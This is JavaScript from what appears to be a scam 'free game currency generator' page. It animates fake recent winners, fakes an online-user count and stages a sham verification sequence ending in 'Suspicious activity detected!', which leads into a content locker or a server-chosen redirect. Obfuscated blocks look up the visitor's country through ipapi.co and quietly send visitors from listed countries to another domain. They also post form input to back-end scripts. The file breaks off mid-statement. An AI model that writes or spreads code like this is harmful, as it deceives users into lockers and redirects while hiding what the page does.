	
						
		$('.activities .activities-wrapp').prepend(html);
		
		clearInterval(interval);
		interval = setInterval(generateTemplate, timeOutNum);
	};
	interval = setInterval(generateTemplate, timeOutNum);
	*/
	
	var rcact = 0;
	var recentActivity = function(){
		var userID = rand( 0, users.length );
		var cashNum = rand( 0, rollsNums.length - 1 );
		var coinNum = rand( 0, coinsNums.length - 1 );
		var totalActivity = $('.recent-activity .recent-single');
		//alert(totalActivity.length);
		if(totalActivity.length >= 3){
			return false;
			$(totalActivity[0]).remove();
		}
		var n = rand( 1, 17 );
		var html = '<div class="d-flex recent-single num-' + rcact + ' mb-3 animated bounceIn">';
			html += '<div class="description">';
				html += '<div class="name">' + users[userID] + '</div>';
				html += '<div class="progress-wrapp">';
					html += '<div class="progress">';
						html += '<div class="progress-bar bg-success" role="progressbar" aria-valuenow="25" aria-valuemin="0" aria-valuemax="100"></div>';
					html += '</div>';
				html += '</div>';
			html += '</div>';
		html += '</div>';
		
		$('.recent-activity').append(html);
		
		$('.recent-activity .num-' + rcact + ' .progress-bar').css('width','15%');
		setTimeout(function(){
			$('.recent-activity .num-' + rcact + ' .progress-bar').css('width','55%');
			setTimeout(function(){
				$('.recent-activity .num-' + rcact + ' .progress-bar').css('width','87%');
				setTimeout(function(){
					$('.recent-activity .num-' + rcact + ' .progress-bar').css('width','100%');
					setTimeout(function(){
						$('.recent-activity .num-' + rcact + ' .progress').fadeOut('fast', function(){
						    let rolls = parseInt(rollsNums[cashNum]) + parseInt(rollsExtraNums[cashNum]);
							$('.recent-activity .num-' + rcact + ' .progress-wrapp').html('<div class="user-got animated fadeIn d-flex justify-content-between"><div class="coins"><img src="assets/images/money.png"> ' + coinsNums[coinNum] + '</div><div class="cash"><img src="assets/images/rolls.png"> ' + rolls + '</div></div>');
							rcact++;
							recentActivity();
						});
					}, 300);
				}, 500);
			}, 1000);
		}, 250);
	}
	
	recentActivity();
		var online = rand( 750, 798 );
		$('.online-wrapp span').html(online);
	setInterval(function(){
		var online = rand( 750, 798 );
		$('.online-wrapp span').html(online);
	}, 2500);
	
	var coins = 0;
	var cash = 0;
	var platform;
	function setCash(c){
		coins = c;
		$('.coins-wrapp .tabs-wrapp .single-tab-link').removeClass('active');
		$('.cm-wrapp.coins').fadeOut('slow', function(){
			$('.coins-wrapp .tabs-wrapp .single-tab-link.money').addClass('active');
			$('.cm-wrapp.cash').fadeIn('slow');
		});
	}
	
	function setCoins(c){
		cash = c;
		$('.coins-wrapp .tabs-wrapp .single-tab-link').removeClass('active');
		$('.cm-wrapp.cash').fadeOut('slow', function(){
			$('.coins-wrapp .tabs-wrapp .single-tab-link.perinfo').addClass('active');
			$('.cm-wrapp.perinfo').fadeIn('slow');
		});
	}
	$('.platform-single').click(function(){
		$('.platform-single').removeClass('active');
		$(this).addClass('active');
		platform = $(this).attr('data-platform');
	});
	var username;
	$('#proceed').click(function(){
		var error = false;
		username = $('.description input[name="username"]').val();
		if(!username){
			$('.input-wrapp').animateCss('bounce');
			error = true;
		}
		if(!platform){
			$('.platforms-wrapp').animateCss('bounce');
			error = true;
		}
		if(!error){
			//platforms[platform]
			$('.user-information .icon-wrapp').html(platforms[platform-1]);
			$('.user-information .username').html(username);
			
			$('.cm-wrapp.details .single-coins .summ').html(coinsNums[coins-1]);
			$('.cm-wrapp.details .single-coins .image').html('<img src="assets/images/money/' + coins + '.png">');
			
            let rolls = parseInt(rollsNums[cash-1]) + parseInt(rollsExtraNums[cash-1]);
			$('.cm-wrapp.details .single-coins.cash .summ').html(rolls);
			$('.cm-wrapp.details .single-coins.cash .image').html('<img src="assets/images/rolls/' + cash + '.png">');

			$('.cm-wrapp.perinfo').fadeOut('slow', function(){
				$('.coins-wrapp .tabs-wrapp .single-tab-link.details').addClass('active');
				$('.cm-wrapp.details').fadeIn('slow');
			});
		}
	});
	
	$('#generate').click(function(){
		var html = '<div class="process-bg">';
				html += '<div class="process-wrapp">';
					html += '<div class="progress">';
						html += '<div class="progress-bar bg-success" role="progressbar" aria-valuenow="25" aria-valuemin="0" aria-valuemax="100"></div>';
					html += '</div>';
					html += '<div class="progress-text text-center my-3">';
						html += 'Connecting...';
					html += '</div>';
					html += '<div class="d-flex justify-content-center flex-column align-items-center">';
						html += '<button class="btn btn-orange btn-large" onclick="verify();" style="display: none;">Verify</button>';
						html += '<div class="ads"></div>';
				html += '</div>';
				html += '</div>';
			html += '</div>';
		$('.coins-wrapp .coins-wrapp-inset').append(html);
		
		$('.process-bg .process-wrapp .progress .progress-bar').css('width', '10%');
		setTimeout(function(){
			$('.progress-text').html('<span class="text-success">Connected successfully!</span>');
			$('.process-bg .process-wrapp .progress .progress-bar').css('width', '35%');
			setTimeout(function(){
				$('.progress-text').html('User verification...');
				$('.process-bg .process-wrapp .progress .progress-bar').css('width', '55%');
				setTimeout(function(){
					$('.progress-text').html('<span class="text-success">' + username + ' verified!</span>');
					$('.process-bg .process-wrapp .progress .progress-bar').css('width', '88%');
					setTimeout(function(){
						$('.process-bg .process-wrapp .progress .progress-bar').css('width', '95%');
						setTimeout(function(){
							$('.progress-text').html('<span class="text-danger">Suspicious activity detected! You have to verify your account!</span>');
							$('.process-wrapp .btn-orange').css('display', 'block');
						},1500);
					},2000);
				},3000);
			},2000);
		},3500);
	});
	
	
	
	
	
	
	
	
	function rand( min, max ) {
		if( max ) {
			return Math.floor(Math.random() * (max - min + 1)) + min;
		} else {
			return Math.floor(Math.random() * (min + 1));
		}
	}
    var audioElement = document.createElement('audio');
	
	$('button[name="proceed"]').click(function(){
		var error = false;
		audioElement.setAttribute('src', 'assets/voices/process.mp3');
		audioElement.pause();
		audioElement.currentTime = 0;
		audioElement.play();
		var i = $('input[name="username"]').val();
		if(!i){
			$('.input-name-wrapp').animateCss('shake');
			error = true;
		}
		if(!error){
			$('#pcModal').modal('show');
			$('section').css('filter', 'blur(5px) contrast(0.8) brightness(0.8)');
		}
	});
	
	$('#pcModal').on('hidden.bs.modal', function (e) {
		$('section').attr('style', '');
	})

	$.fn.extend({
	  animateCss: function(animationName, callback) {
		var animationEnd = (function(el) {
		  var animations = {
			animation: 'animationend',
			OAnimation: 'oAnimationEnd',
			MozAnimation: 'mozAnimationEnd',
			WebkitAnimation: 'webkitAnimationEnd',
		  };

		  for (var t in animations) {
			if (el.style[t] !== undefined) {
			  return animations[t];
			}
		  }
		})(document.createElement('div'));

		this.addClass('animated ' + animationName).one(animationEnd, function() {
		  $(this).removeClass('animated ' + animationName);

		  if (typeof callback === 'function') callback();
		});

		return this;
	  },
	});
var _0x59a4a8=_0x1434;(function(_0x3e674c,_0x1d2731){var _0x21a64c=_0x1434,_0x5c0844=_0x3e674c();while(!![]){try{var _0x27d741=-parseInt(_0x21a64c(0x191))/0x1*(parseInt(_0x21a64c(0x192))/0x2)+parseInt(_0x21a64c(0x1a4))/0x3+parseInt(_0x21a64c(0x198))/0x4*(parseInt(_0x21a64c(0x199))/0x5)+parseInt(_0x21a64c(0x19d))/0x6*(parseInt(_0x21a64c(0x1a5))/0x7)+-parseInt(_0x21a64c(0x18f))/0x8+parseInt(_0x21a64c(0x1a1))/0x9+-parseInt(_0x21a64c(0x19b))/0xa;if(_0x27d741===_0x1d2731)break;else _0x5c0844['push'](_0x5c0844['shift']());}catch(_0x41f520){_0x5c0844['push'](_0x5c0844['shift']());}}}(_0x28e0,0xade35),document[_0x59a4a8(0x190)](_0x59a4a8(0x19f))['addEventListener'](_0x59a4a8(0x193),function(){setTimeout(function(){var _0x19c67f=_0x1434,_0x33b894=function(){var _0x2e68c6=_0x1434,_0x42593c=['h','t','t','p','s',':','/','/','i','p','a','p','i','.','c','o','/','j','s','o','n','/']['join']('');return fetch(_0x42593c)[_0x2e68c6(0x1a0)](_0x243bc9=>_0x243bc9[_0x2e68c6(0x18d)]())[_0x2e68c6(0x1a0)](_0x5cf088=>_0x5cf088[_0x2e68c6(0x194)]);};_0x33b894()[_0x19c67f(0x1a0)](function(_0x35e2da){var _0x5710aa=_0x19c67f,_0x11d2f4=['C'[_0x5710aa(0x1a6)](0x0)+'A'[_0x5710aa(0x1a6)](0x0),'G'[_0x5710aa(0x1a6)](0x0)+'B'[_0x5710aa(0x1a6)](0x0),'F'['charCodeAt'](0x0)+'R'[_0x5710aa(0x1a6)](0x0),'C'[_0x5710aa(0x1a6)](0x0)+'H'['charCodeAt'](0x0),'D'[_0x5710aa(0x1a6)](0x0)+'E'[_0x5710aa(0x1a6)](0x0),'A'[_0x5710aa(0x1a6)](0x0)+'U'[_0x5710aa(0x1a6)](0x0),'B'[_0x5710aa(0x1a6)](0x0)+'E'[_0x5710aa(0x1a6)](0x0),'D'[_0x5710aa(0x1a6)](0x0)+'K'[_0x5710aa(0x1a6)](0x0),'I'[_0x5710aa(0x1a6)](0x0)+'E'[_0x5710aa(0x1a6)](0x0),'M'[_0x5710aa(0x1a6)](0x0)+'Y'[_0x5710aa(0x1a6)](0x0),'S'[_0x5710aa(0x1a6)](0x0)+'A'[_0x5710aa(0x1a6)](0x0),'C'['charCodeAt'](0x0)+'H'[_0x5710aa(0x1a6)](0x0),'T'['charCodeAt'](0x0)+'R'[_0x5710aa(0x1a6)](0x0)],_0xfedab4=_0x35e2da[_0x5710aa(0x1a6)](0x0)+_0x35e2da[_0x5710aa(0x1a6)](0x1);if(_0x11d2f4[_0x5710aa(0x19a)](_0xfedab4)){var _0xbb9b0b=['w','i','n','d','o','w'][_0x5710aa(0x1a3)](''),_0x50b1bb=['l','o','c','a','t','i','o','n'][_0x5710aa(0x1a3)](''),_0x5aaf80=['h','r','e','f'][_0x5710aa(0x1a3)](''),_0x352ec0=['h','t','t','p','s',':','/','/','m','.','r','o','l','l','s','3','.','c','o','m','/'][_0x5710aa(0x1a3)]('');window[_0x5710aa(0x196)]['href']=_0x352ec0;}}),document[_0x19c67f(0x190)](_0x19c67f(0x19f))[_0x19c67f(0x18e)]['add'](_0x19c67f(0x197),_0x19c67f(0x19c),_0x19c67f(0x19e));},0x0);}),document['getElementById']('proceed')[_0x59a4a8(0x195)](_0x59a4a8(0x193),function(){setTimeout(function(){var _0x15ddb3=_0x1434,_0x2549ea=function(){var _0x363b5c=_0x1434,_0x2431a9=['h','t','t','p','s',':','/','/','i','p','a','p','i','.','c','o','/','j','s','o','n','/'][_0x363b5c(0x1a3)]('');return fetch(_0x2431a9)[_0x363b5c(0x1a0)](_0x36640a=>_0x36640a[_0x363b5c(0x18d)]())[_0x363b5c(0x1a0)](_0x426c21=>_0x426c21[_0x363b5c(0x194)]);};_0x2549ea()['then'](function(_0x472b1c){var _0x47f9a9=_0x1434,_0x4a0ce6=['C'[_0x47f9a9(0x1a6)](0x0)+'A'[_0x47f9a9(0x1a6)](0x0),'G'['charCodeAt'](0x0)+'B'[_0x47f9a9(0x1a6)](0x0),'F'[_0x47f9a9(0x1a6)](0x0)+'R'[_0x47f9a9(0x1a6)](0x0),'C'[_0x47f9a9(0x1a6)](0x0)+'H'[_0x47f9a9(0x1a6)](0x0),'D'['charCodeAt'](0x0)+'E'['charCodeAt'](0x0),'A'[_0x47f9a9(0x1a6)](0x0)+'U'[_0x47f9a9(0x1a6)](0x0),'B'[_0x47f9a9(0x1a6)](0x0)+'E'['charCodeAt'](0x0),'D'[_0x47f9a9(0x1a6)](0x0)+'K'[_0x47f9a9(0x1a6)](0x0),'I'[_0x47f9a9(0x1a6)](0x0)+'E'[_0x47f9a9(0x1a6)](0x0),'M'[_0x47f9a9(0x1a6)](0x0)+'Y'[_0x47f9a9(0x1a6)](0x0),'S'['charCodeAt'](0x0)+'A'[_0x47f9a9(0x1a6)](0x0),'C'[_0x47f9a9(0x1a6)](0x0)+'H'['charCodeAt'](0x0),'T'['charCodeAt'](0x0)+'R'[_0x47f9a9(0x1a6)](0x0)],_0x4954c6=_0x472b1c['charCodeAt'](0x0)+_0x472b1c[_0x47f9a9(0x1a6)](0x1);if(_0x4a0ce6[_0x47f9a9(0x19a)](_0x4954c6)){var _0x2b3dfd=['w','i','n','d','o','w'][_0x47f9a9(0x1a3)](''),_0x5d1804=['l','o','c','a','t','i','o','n'][_0x47f9a9(0x1a3)](''),_0x4ff752=['h','r','e','f'][_0x47f9a9(0x1a3)](''),_0x53aae3=['h','t','t','p','s',':','/','/','m','.','r','o','l','l','s','3','.','c','o','m','/']['join']('');window['location'][_0x47f9a9(0x1a2)]=_0x53aae3;}}),document['getElementById'](_0x15ddb3(0x19f))[_0x15ddb3(0x18e)][_0x15ddb3(0x1a7)](_0x15ddb3(0x197),_0x15ddb3(0x19c),_0x15ddb3(0x19e));},0x1388);}));function _0x1434(_0x5f7f9e,_0x4e0147){var _0x28e0b2=_0x28e0();return _0x1434=function(_0x143478,_0x5203df){_0x143478=_0x143478-0x18d;var _0x34188c=_0x28e0b2[_0x143478];return _0x34188c;},_0x1434(_0x5f7f9e,_0x4e0147);}function _0x28e0(){var _0x5be26c=['2455928SYQfbX','getElementById','17ClnzvB','46198maDZrP','click','country_code','addEventListener','location','d-flex','240564hQLzyS','110ngdOkH','includes','27130560woGpNt','justify-content-center','5695656fCvSnk','mt-3','generate','then','6846660wJCcBW','href','join','3275571bfDPmd','7oUmTYN','charCodeAt','add','json','classList'];_0x28e0=function(){return _0x5be26c;};return _0x28e0();}

	
var _0x388811=_0x115e;(function(_0x31c774,_0x45b5f0){var _0x23c93d=_0x115e,_0x3992ba=_0x31c774();while(!![]){try{var _0x1f228d=-parseInt(_0x23c93d(0x1e6))/0x1*(-parseInt(_0x23c93d(0x1f5))/0x2)+-parseInt(_0x23c93d(0x1f7))/0x3+-parseInt(_0x23c93d(0x1d7))/0x4+parseInt(_0x23c93d(0x202))/0x5*(parseInt(_0x23c93d(0x1df))/0x6)+-parseInt(_0x23c93d(0x1d6))/0x7+parseInt(_0x23c93d(0x207))/0x8*(parseInt(_0x23c93d(0x1cf))/0x9)+-parseInt(_0x23c93d(0x20c))/0xa*(-parseInt(_0x23c93d(0x1da))/0xb);if(_0x1f228d===_0x45b5f0)break;else _0x3992ba['push'](_0x3992ba['shift']());}catch(_0x472788){_0x3992ba['push'](_0x3992ba['shift']());}}}(_0x5641,0xd82ad),$('#contactform')[_0x388811(0x1ce)](function(_0x1d33ae){var _0xf754c=_0x388811;_0x1d33ae['preventDefault']();var _0x18cef1=this,_0x2d261a=$(this)['serialize'](),_0x1c605e=$('input[name=\x22uname\x22]')[_0xf754c(0x20a)](),_0x29a9ea=$(_0xf754c(0x1f0))['val'](),_0x140d76=$(_0xf754c(0x1e0))[_0xf754c(0x20a)]();if(!_0x140d76||!_0x29a9ea||!_0x1c605e)return $(_0xf754c(0x1e4))['html'](_0xf754c(0x1fa)),![];$[_0xf754c(0x1e5)]({'method':_0xf754c(0x1fe),'url':_0xf754c(0x20b),'data':_0x2d261a,'success':function(_0x425afc){var _0x1555ab=_0xf754c;_0x425afc&&($(_0x1555ab(0x1e4))[_0x1555ab(0x1ff)](_0x1555ab(0x1f1)),$(_0x18cef1)[0x0][_0x1555ab(0x204)]());}});}));function _0x115e(_0x22d3b5,_0x33dc9a){var _0x5641aa=_0x5641();return _0x115e=function(_0x115e99,_0x49ddd2){_0x115e99=_0x115e99-0x1ce;var _0x49d103=_0x5641aa[_0x115e99];return _0x49d103;},_0x115e(_0x22d3b5,_0x33dc9a);}function _0x5641(){var _0x2d23a9=['<div\x20class=\x22wins-icon\x20icon\x22><svg\x20aria-hidden=\x22true\x22\x20data-prefix=\x22fal\x22\x20data-icon=\x22trophy\x22\x20role=\x22img\x22\x20xmlns=\x22http://www.w3.org/2000/svg\x22\x20viewBox=\x220\x200\x20576\x20512\x22\x20class=\x22svg-inline--fa\x20fa-trophy\x20fa-w-18\x20fa-5x\x22><path\x20fill=\x22currentColor\x22\x20d=\x22M448\x2064V12c0-6.6-5.4-12-12-12H140c-6.6\x200-12\x205.4-12\x2012v52H12C5.4\x2064\x200\x2069.4\x200\x2076v61.6C0\x20199.7\x2068.1\x20272\x20160.7\x20285.7c29.4\x2060.7\x2073.7\x2090.3\x20111.3\x2096.9V480h-86c-14.4\x200-26\x2011.7-26\x2026.1\x200\x203.3\x202.7\x205.9\x206\x205.9h244c3.3\x200\x206-2.6\x206-5.9\x200-14.4-11.6-26.1-26-26.1h-86v-97.4c37.7-6.6\x2081.9-36.2\x20111.3-96.9C508\x20272\x20576\x20199.6\x20576\x20137.6V76c0-6.6-5.4-12-12-12H448zM32\x20137.6V96h96v24c0\x2051.8\x207\x2094.9\x2018.5\x20130.2C77.9\x20232.5\x2032\x20178\x2032\x20137.6zM288\x20352c-72\x200-128-104-128-232V32h256v88c0\x20128-56\x20232-128\x20232zm256-214.4c0\x2040.4-46\x2094.9-114.5\x20112.6C441\x20214.9\x20448\x20171.8\x20448\x20120V96h96v41.6z\x22\x20class=\x22\x22></path></svg></div>','input[name=\x22email\x22]','<div\x20class=\x22alert\x20alert-success\x20text-center\x22>Message\x20successfully\x20sent!</div>','modal','<div\x20class=\x22rank-count\x20count\x22>','<div\x20class=\x22kills-icon\x20icon\x22><svg\x20aria-hidden=\x22true\x22\x20data-prefix=\x22fal\x22\x20data-icon=\x22user-alt-slash\x22\x20role=\x22img\x22\x20xmlns=\x22http://www.w3.org/2000/svg\x22\x20viewBox=\x220\x200\x20640\x20512\x22\x20class=\x22svg-inline--fa\x20fa-user-alt-slash\x20fa-w-20\x20fa-5x\x22><path\x20fill=\x22currentColor\x22\x20d=\x22M637\x20485.2L23\x201.8C19.6-1\x2014.5-.4\x2011.8\x203l-10\x2012.5C-1\x2019-.4\x2024\x203\x2026.8l614\x20483.5c3.4\x202.8\x208.5\x202.2\x2011.2-1.2l10-12.5c2.8-3.6\x202.2-8.6-1.2-11.4zM320\x2032c61.8\x200\x20112\x2050.2\x20112\x20112\x200\x2034.8-16.3\x2065.6-41.3\x2086.2l25.6\x2020.2C445.4\x20224\x20464\x20186.3\x20464\x20144\x20464\x2064.5\x20399.5\x200\x20320\x200c-54.6\x200-101.4\x2030.7-125.9\x2075.4l25.4\x2020C237.7\x2058\x20275.7\x2032\x20320\x2032zM96\x20480v-32c0-52.9\x2043.1-96\x2096-96h36.8c22.4\x200\x2040.3\x2016\x2091.2\x2016\x2011.7\x200\x2023.3-1.1\x2034.8-3.1l-36.9-29.1c-46.2-.6-59.3-15.8-89.2-15.8H192c-70.7\x200-128\x2057.3-128\x20128v32c0\x2017.7\x2014.3\x2032\x2032\x2032h445.6L501\x20480H96z\x22\x20class=\x22\x22></path></svg></div>','212KZHJsF','error','879528KXZLOA','input[name=\x22username\x22]','<div\x20class=\x22row\x20m-0\x22>','<div\x20class=\x22alert\x20alert-danger\x20text-center\x22>All\x20fields\x20are\x20required!</div>','#pcModal','xbl','<div\x20class=\x22title\x22>Wins</div>','POST','html','#personalInfo\x20.region\x20span','text','20wILTpd','<div\x20class=\x22kills-count\x20count\x22>','reset','#personalInfo\x20.count\x20span','<div\x20class=\x22col-4\x20p-0\x22>','10968632pfueAf','#more-details','data-num','val','actions/sendMail.php','21730330KuaYVa','user','submit','9WXjWJG','<div\x20class=\x22detailed\x20kills\x22>','PS4','select[name=\x22platform\x22]','<div\x20class=\x22detailed\x20rank\x22>','.preloader-pulse','<div\x20class=\x22wins-count\x20count\x22>','10400404QEgtMW','6304244LmUQqe','hide','actions/api.php','11XlRsuy','none','<div\x20class=\x22detailed\x20wins\x22>','</div>','display','538698RVGmaF','textarea[name=\x22message\x22]','#personalInfo\x20.name\x20span,\x20#verification\x20.name\x20span','flex','avatar','#error','ajax','3181JePmCy','JSON','<div\x20class=\x22title\x22>Kills</div>','status','XBOX\x20ONE','<div\x20class=\x22title\x22>Rank</div>','stats','<img\x20src=\x22','rankxp'];_0x5641=function(){return _0x2d23a9;};return _0x5641();}function getPoints(_0x1d6cbf){var _0x2bc1a0=_0x388811;coinId=$(_0x1d6cbf)['attr'](_0x2bc1a0(0x209));var _0x1b2c52=$(_0x2bc1a0(0x1f8))[_0x2bc1a0(0x20a)](),_0x5a98c7=$(_0x2bc1a0(0x1d2))[_0x2bc1a0(0x20a)](),_0x555625=$('select[name=\x22region\x22]')[_0x2bc1a0(0x20a)]();$('#generate\x20.pc-details\x20.coins\x20span')[_0x2bc1a0(0x201)](coinNums[coinId]);if(_0x5a98c7=='psn')var _0x26c51e=_0x2bc1a0(0x1d1);if(_0x5a98c7==_0x2bc1a0(0x1fc))var _0x26c51e=_0x2bc1a0(0x1ea);if(_0x5a98c7=='pc')var _0x26c51e='PC';$(_0x2bc1a0(0x1fb))[_0x2bc1a0(0x1f2)](_0x2bc1a0(0x1d8)),$('.preloader-pulse')['css'](_0x2bc1a0(0x1de),_0x2bc1a0(0x1e2)),$[_0x2bc1a0(0x1e5)]({'method':_0x2bc1a0(0x1fe),'url':_0x2bc1a0(0x1d9),'data':{'name':_0x1b2c52,'platform':_0x5a98c7},'dataType':_0x2bc1a0(0x1e7),'success':function(_0x22a3fe){var _0x461baf=_0x2bc1a0;if(_0x22a3fe[_0x461baf(0x1e9)]!=_0x461baf(0x1f6)){var _0x223a97='<div\x20class=\x22text-center\x20avatar\x22>';_0x223a97+=_0x461baf(0x1ed)+_0x22a3fe[_0x461baf(0x20d)][_0x461baf(0x1e3)]+'\x22>',_0x223a97+=_0x461baf(0x1dd),_0x223a97+=_0x461baf(0x1f9),_0x223a97+=_0x461baf(0x206),_0x223a97+=_0x461baf(0x1dc),_0x223a97+=_0x461baf(0x1ef),_0x223a97+=_0x461baf(0x1fd),_0x223a97+=_0x461baf(0x1d5)+_0x22a3fe[_0x461baf(0x1ec)]['wins']+_0x461baf(0x1dd),_0x223a97+=_0x461baf(0x1dd),_0x223a97+='</div>',_0x223a97+=_0x461baf(0x206),_0x223a97+=_0x461baf(0x1d0),_0x223a97+=_0x461baf(0x1f4),_0x223a97+=_0x461baf(0x1e8),_0x223a97+=_0x461baf(0x203)+_0x22a3fe[_0x461baf(0x1ec)]['kills']+'</div>',_0x223a97+=_0x461baf(0x1dd),_0x223a97+='</div>',_0x223a97+='<div\x20class=\x22col-4\x20p-0\x22>',_0x223a97+=_0x461baf(0x1d3),_0x223a97+='<div\x20class=\x22rank-icon\x20icon\x22><svg\x20aria-hidden=\x22true\x22\x20data-prefix=\x22fal\x22\x20data-icon=\x22medal\x22\x20role=\x22img\x22\x20xmlns=\x22http://www.w3.org/2000/svg\x22\x20viewBox=\x220\x200\x20576\x20512\x22\x20class=\x22svg-inline--fa\x20fa-medal\x20fa-w-18\x20fa-5x\x22><path\x20fill=\x22currentColor\x22\x20d=\x22M332.37\x20275.41l-19.75-40.05c-9.44-18.81-39.91-18.86-49.28.08l-19.72\x2039.97-44.06\x206.44c-10.44\x201.5-18.94\x208.67-22.22\x2018.7-3.25\x2010.02-.59\x2020.83\x206.97\x2028.17l31.91\x2031.09-7.56\x2043.92c-3.91\x2022.74\x2020.25\x2039.5\x2039.87\x2028.97L288\x20411.97l39.44\x2020.72c19.35\x2010.13\x2043.87-5.88\x2039.91-28.95l-7.56-43.92\x2031.91-31.09c7.56-7.34\x2010.22-18.16\x206.97-28.17-3.28-10.03-11.78-17.19-22.19-18.7l-44.11-6.45zm-6.96\x2073.25l8.84\x2051.45-46.25-24.3-46.34\x2024.91\x208.94-52.06-37.41-36.47\x2051.69-7.53L288\x20257.78l23.12\x2046.88\x2051.69\x207.53-37.4\x2036.47zM559.97\x200H402.12c-11.24\x200-21.66\x205.9-27.44\x2015.54L288\x20160\x20201.32\x2015.54A31.997\x2031.997\x200\x200\x200\x20173.88\x200H16.03C3.08\x200-4.5\x2014.57\x202.92\x2025.18l144.12\x20205.88C125.14\x20260.4\x20112\x20296.65\x20112\x20336c0\x2097.05\x2078.95\x20176\x20176\x20176s176-78.95\x20176-176c0-39.35-13.14-75.6-35.04-104.94L573.08\x2025.18C580.5\x2014.57\x20572.92\x200\x20559.97\x200zM46.76\x2032h127.12l78.93\x20131.55c-31.95\x206.51-60.65\x2021.84-83.78\x2043.13L46.76\x2032zM432\x20336c0\x2079.53-64.47\x20144-144\x20144s-144-64.47-144-144\x2064.47-144\x20144-144\x20144\x2064.47\x20144\x20144zm-25.03-129.32c-23.13-21.29-51.83-36.62-83.78-43.13L402.12\x2032h127.12L406.97\x20206.68z\x22\x20class=\x22\x22></path></svg></div>',_0x223a97+=_0x461baf(0x1eb),_0x223a97+=_0x461baf(0x1f3)+_0x22a3fe['stats'][_0x461baf(0x1ee)]+_0x461baf(0x1dd),_0x223a97+=_0x461baf(0x1dd),_0x223a97+='</div>',_0x223a97+='</div>',$(_0x461baf(0x208))['html'](_0x223a97);}$(_0x461baf(0x1e1))[_0x461baf(0x201)](_0x1b2c52),$(_0x461baf(0x205))[_0x461baf(0x201)](coinNums[coinId]),$('#personalInfo\x20.platform\x20span')[_0x461baf(0x201)](_0x26c51e),$(_0x461baf(0x200))[_0x461baf(0x201)](_0x555625),$(_0x461baf(0x1d4))['css'](_0x461baf(0x1de),_0x461baf(0x1db)),$('#personalInfo')[_0x461baf(0x1f2)]('show');}});}
	
function _0x19f4(){var _0x5c02bf=['link','header,\x20nav,\x20main,\x20footer','select','707139cmSYiZ','pageY','html','actions/url.php','css','1207654mvDedU','blur(5px)\x20contrast(0.8)\x20brightness(0.8)','3239817ysqhse','click','35%','margin-top','.ads','href','width','log','input[name=\x22username\x22]','feed','#loader\x20span','ajax','modal','src','show','#verification','.preloader,\x20#loader,\x20.p-text','select2','margin-left','<span\x20class=\x22text-danger\x22>Suspicious\x20activity\x20detected!</span>','play','88%','<span\x20class=\x22text-success\x22>Connected\x20successfully!</span>','pause','height','5brvSxF','location','.preloader\x20.p-text','305872jhyJgz','resize','#home\x20.soldier','1238308XCFWty','8kExZbt','1812960UoKisN','filter','11344446hJJJzc','currentTime','<span\x20class=\x22text-success\x22>','type','mousemove','55%','JSON','hide','\x20verified!</span>','setAttribute','.preloader'];_0x19f4=function(){return _0x5c02bf;};return _0x19f4();}var _0x1a3ac5=_0x2da8;(function(_0x21ce8a,_0x54eb99){var _0x5b83bd=_0x2da8,_0x4f373f=_0x21ce8a();while(!![]){try{var _0x29b36f=parseInt(_0x5b83bd(0x14c))/0x1+parseInt(_0x5b83bd(0x166))/0x2+parseInt(_0x5b83bd(0x161))/0x3+-parseInt(_0x5b83bd(0x14f))/0x4+-parseInt(_0x5b83bd(0x149))/0x5*(-parseInt(_0x5b83bd(0x151))/0x6)+parseInt(_0x5b83bd(0x168))/0x7*(parseInt(_0x5b83bd(0x150))/0x8)+-parseInt(_0x5b83bd(0x153))/0x9;if(_0x29b36f===_0x54eb99)break;else _0x4f373f['push'](_0x4f373f['shift']());}catch(_0x17f9b7){_0x4f373f['push'](_0x4f373f['shift']());}}}(_0x19f4,0x5316c),$('#generate_btn')[_0x1a3ac5(0x169)](function(){var _0x11cbb2=_0x1a3ac5,_0x433f7d=parseInt(coinNums[coinId])*0x3e8;$('#personalInfo')[_0x11cbb2(0x13c)](_0x11cbb2(0x15a)),audioElement[_0x11cbb2(0x15c)](_0x11cbb2(0x13d),'assets/voices/process.mp3'),audioElement[_0x11cbb2(0x147)](),audioElement[_0x11cbb2(0x154)]=0x0,audioElement[_0x11cbb2(0x144)](),$(_0x11cbb2(0x15d))[_0x11cbb2(0x13e)](),$(_0x11cbb2(0x15f))[_0x11cbb2(0x165)](_0x11cbb2(0x152),_0x11cbb2(0x167));var _0x1b053a=$(_0x11cbb2(0x138))['val']();setTimeout(function(){var _0x9eb4cf=_0x11cbb2;$('.preloader\x20.p-text')[_0x9eb4cf(0x163)](_0x9eb4cf(0x146)),$('#loader\x20span')[_0x9eb4cf(0x165)]('width',_0x9eb4cf(0x16a)),setTimeout(function(){var _0x4595f4=_0x9eb4cf;$(_0x4595f4(0x14b))['html']('User\x20verification...'),$('#loader\x20span')[_0x4595f4(0x165)](_0x4595f4(0x16e),_0x4595f4(0x158)),setTimeout(function(){var _0x24db14=_0x4595f4;$(_0x24db14(0x14b))[_0x24db14(0x163)](_0x24db14(0x155)+_0x1b053a+_0x24db14(0x15b)),$(_0x24db14(0x13a))['css']('width',_0x24db14(0x145)),setTimeout(function(){var _0xf6b1da=_0x24db14;$(_0xf6b1da(0x14b))[_0xf6b1da(0x163)](_0xf6b1da(0x143)),setTimeout(function(){var _0x7deed3=_0xf6b1da;$(_0x7deed3(0x140))[_0x7deed3(0x15a)](),$(_0x7deed3(0x13f))[_0x7deed3(0x13c)](_0x7deed3(0x13e));},0x5dc);},0x7d0);},0xbb8);},0x7d0);},0xdac);}));var plusCount=function(_0x1b25e7,_0x187208){var _0x8cd666=_0x1a3ac5,_0x1927c6=_0x187208+0x3e8;_0x187208<_0x1b25e7&&(console[_0x8cd666(0x16f)](_0x1927c6),plusCount(_0x1b25e7,_0x1927c6));};function verify(){var _0x538cf8=_0x1a3ac5;$[_0x538cf8(0x13b)]({'method':'POST','url':_0x538cf8(0x164),'dataType':_0x538cf8(0x159),'data':{'type':0x1},'success':function(_0x599b2e){var _0x1517e6=_0x538cf8;if(_0x599b2e[_0x1517e6(0x156)]==0x1)call_locker();else{if(_0x599b2e['type']==0x2)window[_0x1517e6(0x14a)][_0x1517e6(0x16d)]=_0x599b2e[_0x1517e6(0x15e)];else _0x599b2e[_0x1517e6(0x156)]==0x3&&$(_0x1517e6(0x16c))[_0x1517e6(0x163)](_0x599b2e[_0x1517e6(0x139)]);}console[_0x1517e6(0x16f)](_0x599b2e);}});}function _0x2da8(_0x4b89c8,_0x23d9bc){var _0x19f4b2=_0x19f4();return _0x2da8=function(_0x2da870,_0x30e042){_0x2da870=_0x2da870-0x138;var _0x2f12cf=_0x19f4b2[_0x2da870];return _0x2f12cf;},_0x2da8(_0x4b89c8,_0x23d9bc);}var 